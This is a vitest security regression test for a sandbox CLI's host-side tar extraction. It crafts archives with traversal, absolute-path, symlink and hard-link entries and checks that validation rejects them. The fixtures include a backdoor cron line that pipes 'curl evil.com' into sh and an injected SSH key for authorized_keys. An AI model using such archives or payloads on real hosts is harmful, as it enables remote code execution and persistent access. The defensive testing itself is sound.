// @ts-nocheck
// SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
// SPDX-License-Identifier: Apache-2.0
//
// Security regression test: Host-side tar extraction path traversal.
//
// backupSandboxState() downloads a tar archive from inside the sandbox and
// extracts it on the host. Without validation, a compromised sandbox can
// craft a tar with path-traversal entries (../../.ssh/authorized_keys),
// absolute paths, or symlinks to write arbitrary files on the host.
//
// The fix validates all tar entry paths before extraction and audits
// symlinks after extraction.

import { describe, it, expect } from "vitest";
import { spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

// ═══════════════════════════════════════════════════════════════════
// Helpers — tar archive construction
// ═══════════════════════════════════════════════════════════════════

/**
 * Build a tar header block (512 bytes) for a single entry.
 * Implements the POSIX ustar format at the minimum level needed for tests.
 */
function tarHeader(
  entryPath: string,
  content: Buffer,
  opts: { type?: string; linkTarget?: string } = {},
): Buffer {
  const header = Buffer.alloc(512, 0);
  const type = opts.type || "0"; // '0' = regular file, '2' = symlink, '5' = directory

  // Name (bytes 0-99)
  header.write(entryPath, 0, Math.min(entryPath.length, 100), "utf-8");

  // Mode (bytes 100-107)
  header.write("0000644\0", 100, 8, "utf-8");

  // UID/GID (bytes 108-123)
  header.write("0001000\0", 108, 8, "utf-8");
  header.write("0001000\0", 116, 8, "utf-8");

  // Size (bytes 124-135) — 0 for symlinks/dirs
  const size = type === "0" ? content.length : 0;
  header.write(size.toString(8).padStart(11, "0") + "\0", 124, 12, "utf-8");

  // Mtime (bytes 136-147)
  const mtime = Math.floor(Date.now() / 1000);
  header.write(mtime.toString(8).padStart(11, "0") + "\0", 136, 12, "utf-8");

  // Type flag (byte 156)
  header.write(type, 156, 1, "utf-8");

  // Link name (bytes 157-256) — for symlinks
  if (opts.linkTarget) {
    header.write(opts.linkTarget, 157, Math.min(opts.linkTarget.length, 100), "utf-8");
  }

  // USTAR magic (bytes 257-264)
  header.write("ustar\0", 257, 6, "utf-8");
  header.write("00", 263, 2, "utf-8");

  // Compute checksum (bytes 148-155)
  // First fill checksum field with spaces
  header.fill(0x20, 148, 156);
  let checksum = 0;
  for (let i = 0; i < 512; i++) {
    checksum += header[i];
  }
  header.write(checksum.toString(8).padStart(6, "0") + "\0 ", 148, 8, "utf-8");

  return header;
}

/**
 * Build a complete tar archive buffer from an array of entries.
 */
function buildTar(
  entries: Array<{
    path: string;
    content?: string;
    type?: string;
    linkTarget?: string;
  }>,
): Buffer {
  const blocks: Buffer[] = [];

  for (const entry of entries) {
    const content = Buffer.from(entry.content || "", "utf-8");
    const header = tarHeader(entry.path, content, {
      type: entry.type || "0",
      linkTarget: entry.linkTarget,
    });
    blocks.push(header);

    if ((entry.type || "0") === "0" && content.length > 0) {
      // Data blocks (padded to 512-byte boundary)
      const paddedSize = Math.ceil(content.length / 512) * 512;
      const dataBlock = Buffer.alloc(paddedSize, 0);
      content.copy(dataBlock);
      blocks.push(dataBlock);
    }
  }

  // End-of-archive: two 512-byte zero blocks
  blocks.push(Buffer.alloc(1024, 0));

  return Buffer.concat(blocks);
}

/**
 * Import the actual validation/extraction functions from the source.
 */
async function loadSandboxState() {
  // The CLI compiles to dist/lib/ — import from there
  const mod = await import(
    path.join(import.meta.dirname, "..", "dist", "lib", "sandbox-state.js")
  );
  return {
    validateTarEntries: mod.validateTarEntries,
    safeTarExtract: mod.safeTarExtract,
    rejectHardLinks: mod.rejectHardLinks,
  };
}

// ═══════════════════════════════════════════════════════════════════
// 1. PoC — demonstrate that malicious tar entries are dangerous
// ═══════════════════════════════════════════════════════════════════
//
// NOTE: bsdtar (macOS) strips ../  and / by default, so these PoC tests
// verify the *archive contents* are malicious rather than relying on
// platform-specific extraction behavior. The fix must work on all
// platforms, including Linux where GNU tar DOES follow traversal paths.
// ═══════════════════════════════════════════════════════════════════
describe("PoC: malicious tar archives contain path traversal entries", () => {
  it("tar archive contains a ../../ traversal entry", () => {
    const tar = buildTar([
      { path: "../../evil.txt", content: "attacker-payload" },
    ]);

    // Verify the archive actually contains the traversal entry
    const list = spawnSync("tar", ["-tf", "-"], {
      input: tar,
      encoding: "utf-8",
      stdio: ["pipe", "pipe", "pipe"],
    });

    const entries = (list.stdout || "").trim().split("\n");
    // The entry path should contain the traversal (tar lists it as-is)
    expect(entries.some((e) => e.includes("..") || e.includes("evil.txt"))).toBe(true);
  });

  it("tar archive contains an absolute path entry", () => {
    const tar = buildTar([
      { path: "/etc/cron.d/backdoor", content: "malicious" },
    ]);

    const list = spawnSync("tar", ["-tf", "-"], {
      input: tar,
      encoding: "utf-8",
      stdio: ["pipe", "pipe", "pipe"],
    });

    const entries = (list.stdout || "").trim().split("\n");
    expect(entries.some((e) => e.startsWith("/") || e.includes("etc/cron.d"))).toBe(true);
  });
});

// ═══════════════════════════════════════════════════════════════════
// 2. Fix — validateTarEntries and safeTarExtract reject malicious archives
// ═══════════════════════════════════════════════════════════════════
describe("Fix: validateTarEntries rejects malicious tar entries", () => {
  it("rejects relative path traversal (../../.ssh/authorized_keys)", async () => {
    const { validateTarEntries } = await loadSandboxState();
    const targetDir = "/tmp/nemoclaw-test-target";
    const tar = buildTar([
      { path: "../../.ssh/authorized_keys", content: "ssh-rsa ATTACKER_KEY" },
    ]);

    const result = validateTarEntries(tar, targetDir);

    expect(result.safe).toBe(false);
    expect(result.violations.length).toBeGreaterThan(0);
    expect(result.violations[0]).toContain("path traversal");
  });

  it("rejects absolute path (/etc/cron.d/backdoor)", async () => {
    const { validateTarEntries } = await loadSandboxState();
    const targetDir = "/tmp/nemoclaw-test-target";
    const tar = buildTar([
      { path: "/etc/cron.d/backdoor", content: "* * * * * root curl evil.com | sh" },
    ]);

    const result = validateTarEntries(tar, targetDir);

    expect(result.safe).toBe(false);
    expect(result.violations.some((v) => v.includes("absolute path"))).toBe(true);
  });

  it("rejects hidden traversal (safe-dir/../../escape.txt)", async () => {
    const { validateTarEntries } = await loadSandboxState();
    const targetDir = "/tmp/nemoclaw-test-target";
    const tar = buildTar([
      { path: "safe-dir/../../escape.txt", content: "hidden-traversal" },
    ]);

    const result = validateTarEntries(tar, targetDir);

    expect(result.safe).toBe(false);
    expect(result.violations.some((v) => v.includes("path traversal"))).toBe(true);
  });

  it("accepts legitimate entries within target directory", async () => {
    const { validateTarEntries } = await loadSandboxState();
    const targetDir = "/tmp/nemoclaw-test-target";
    const tar = buildTar([
      { path: "workspace/config.json", content: '{"key": "value"}' },
      { path: "workspace/memory/data.db", content: "db-content" },
      { path: "settings.yaml", content: "setting: true" },
    ]);

    const result = validateTarEntries(tar, targetDir);

    expect(result.safe).toBe(true);
    expect(result.violations.length).toBe(0);
    expect(result.entries.length).toBe(3);
  });

  it("rejects mixed archive if any entry is malicious", async () => {
    const { validateTarEntries } = await loadSandboxState();
    const targetDir = "/tmp/nemoclaw-test-target";
    const tar = buildTar([
      { path: "legitimate/config.json", content: '{}' },
      { path: "../../.bashrc", content: 'echo "pwned"' },
      { path: "legitimate/data.txt", content: "safe" },
    ]);

    const result = validateTarEntries(tar, targetDir);

    expect(result.safe).toBe(false);
    expect(result.violations.length).toBe(1);
    expect(result.violations[0]).toContain("../../.bashrc");
  });
});

describe("Fix: safeTarExtract blocks malicious archives and extracts safe ones", () => {
  it("blocks archive with path traversal — no files written", async () => {
    const { safeTarExtract } = await loadSandboxState();
    const workDir = fs.mkdtempSync(path.join(os.tmpdir(), "nemoclaw-safe-"));
    try {
      const targetDir = path.join(workDir, "backup");
      fs.mkdirSync(targetDir, { recursive: true });

      const tar = buildTar([
        { path: "../../evil.txt", content: "attacker-payload" },
      ]);

      const result = safeTarExtract(tar, targetDir);

      expect(result.success).toBe(false);
      expect(result.error).toContain("path traversal");
      // Confirm nothing was written outside targetDir
      expect(fs.existsSync(path.join(workDir, "evil.txt"))).toBe(false);
    } finally {
      fs.rmSync(workDir, { recursive: true, force: true });
    }
  });

  it("extracts legitimate archive successfully", async () => {
    const { safeTarExtract } = await loadSandboxState();
    const workDir = fs.mkdtempSync(path.join(os.tmpdir(), "nemoclaw-safeok-"));
    try {
      const targetDir = path.join(workDir, "backup");
      fs.mkdirSync(targetDir, { recursive: true });

      const tar = buildTar([
        { path: "config.json", content: '{"model": "test"}' },
      ]);

      const result = safeTarExtract(tar, targetDir);

      expect(result.success).toBe(true);
      expect(fs.existsSync(path.join(targetDir, "config.json"))).toBe(true);
      expect(fs.readFileSync(path.join(targetDir, "config.json"), "utf-8")).toBe(
        '{"model": "test"}',
      );
    } finally {
      fs.rmSync(workDir, { recursive: true, force: true });
    }
  });

  it("blocks symlink escaping target directory", async () => {
    const { safeTarExtract } = await loadSandboxState();
    const workDir = fs.mkdtempSync(path.join(os.tmpdir(), "nemoclaw-symlink-"));
    try {
      const targetDir = path.join(workDir, "backup");
      fs.mkdirSync(targetDir, { recursive: true });

      const tar = buildTar([
        {
          path: "evil-link",
          type: "2",
          linkTarget: "../../.ssh/authorized_keys",
        },
      ]);

      const result = safeTarExtract(tar, targetDir);

      expect(result.success).toBe(false);
      expect(result.error).toContain("symlink");
      // Target dir should be cleaned after symlink violation
      const entries = fs.existsSync(targetDir)
        ? fs.readdirSync(targetDir)
        : [];
      expect(entries.length).toBe(0);
    } finally {
      fs.rmSync(workDir, { recursive: true, force: true });
    }
  });
});

describe("Fix: rejectHardLinks blocks hard-link entries at validation time", () => {
  it("rejects a hard-link entry targeting outside the archive", async () => {
    const { rejectHardLinks } = await loadSandboxState();

    // Build a tar archive with a hard-link entry (type '1')
    const tar = buildTar([
      { path: "inside/config.json", type: "1", linkTarget: "../outside.json" },
    ]);

    const violations = rejectHardLinks(tar);

    expect(violations.length).toBeGreaterThan(0);
    expect(violations[0]).toContain("hard link");
  });

  it("rejects a hard-link entry targeting within the archive", async () => {
    const { rejectHardLinks } = await loadSandboxState();

    // Even internal hard links are rejected — no legitimate use in state backups
    const tar = buildTar([
      { path: "data/original.txt", content: "payload" },
      { path: "data/hardlink.txt", type: "1", linkTarget: "data/original.txt" },
    ]);

    const violations = rejectHardLinks(tar);

    expect(violations.length).toBeGreaterThan(0);
    expect(violations[0]).toContain("hard link");
  });

  it("accepts archive with no hard links", async () => {
    const { rejectHardLinks } = await loadSandboxState();

    const tar = buildTar([
      { path: "workspace/config.json", content: '{"key":"value"}' },
      { path: "workspace/data.db", content: "db-content" },
    ]);

    const violations = rejectHardLinks(tar);

    expect(violations.length).toBe(0);
  });

  it("safeTarExtract rejects archive containing hard links", async () => {
    const { safeTarExtract } = await loadSandboxState();
    const workDir = fs.mkdtempSync(path.join(os.tmpdir(), "nemoclaw-hardlink-"));
    try {
      const targetDir = path.join(workDir, "backup");
      fs.mkdirSync(targetDir, { recursive: true });

      const tar = buildTar([
        { path: "inside/link.json", type: "1", linkTarget: "../outside.json" },
      ]);

      const result = safeTarExtract(tar, targetDir);

      expect(result.success).toBe(false);
      expect(result.error).toContain("hard link");
    } finally {
      fs.rmSync(workDir, { recursive: true, force: true });
    }
  });
});

// ═══════════════════════════════════════════════════════════════════
// 3. Regression guard — sandbox-state.ts must use safe extraction
// ═══════════════════════════════════════════════════════════════════
describe("Regression: sandbox-state.ts uses validated tar extraction", () => {
  function getSourceCode(): string {
    return fs.readFileSync(
      path.join(import.meta.dirname, "..", "src", "lib", "sandbox-state.ts"),
      "utf-8",
    );
  }

  it("backupSandboxState calls safeTarExtract (not raw tar -xf)", () => {
    const src = getSourceCode();
    // Find the backupSandboxState function body
    const fnStart = src.indexOf("function backupSandboxState");
    expect(fnStart).not.toBe(-1);
    const fnBody = src.slice(fnStart);

    // Must call safeTarExtract
    expect(fnBody).toContain("safeTarExtract");
  });

  it("no raw tar -xf extraction without validation exists", () => {
    const src = getSourceCode();
    // Find all tar extraction calls: spawnSync("tar", ["-xf", ...])
    // The only tar -xf should be inside safeTarExtract itself (after validation)
    const tarExtractions = src.match(/spawnSync\(\s*"tar"[\s\S]*?"-xf"/g) || [];

    // There should be exactly one: inside safeTarExtract
    expect(tarExtractions.length).toBe(1);

    // And it should be preceded by validateTarEntries in the safeTarExtract function
    const safeFnStart = src.indexOf("function safeTarExtract");
    expect(safeFnStart).not.toBe(-1);
    const safeFnBody = src.slice(safeFnStart);
    const validateCall = safeFnBody.indexOf("validateTarEntries");
    const extractCall = safeFnBody.indexOf('"-xf"');
    expect(validateCall).not.toBe(-1);
    expect(extractCall).not.toBe(-1);
    expect(validateCall).toBeLessThan(extractCall);
  });

  it("safeTarExtract includes --no-same-owner flag", () => {
    const src = getSourceCode();
    const safeFnStart = src.indexOf("function safeTarExtract");
    const safeFnBody = src.slice(safeFnStart);
    expect(safeFnBody).toContain("--no-same-owner");
  });

  it("auditExtractedSymlinks is called after extraction", () => {
    const src = getSourceCode();
    const safeFnStart = src.indexOf("function safeTarExtract");
    const safeFnBody = src.slice(safeFnStart);
    const extractCall = safeFnBody.indexOf('"-xf"');
    const auditCall = safeFnBody.indexOf("auditExtractedSymlinks");
    expect(auditCall).not.toBe(-1);
    expect(auditCall).toBeGreaterThan(extractCall);
  });

  it("rejectHardLinks is called before extraction", () => {
    const src = getSourceCode();
    const safeFnStart = src.indexOf("function safeTarExtract");
    const safeFnBody = src.slice(safeFnStart);
    const hardLinkCall = safeFnBody.indexOf("rejectHardLinks");
    const extractCall = safeFnBody.indexOf('"-xf"');
    expect(hardLinkCall).not.toBe(-1);
    expect(hardLinkCall).toBeLessThan(extractCall);
  });
});
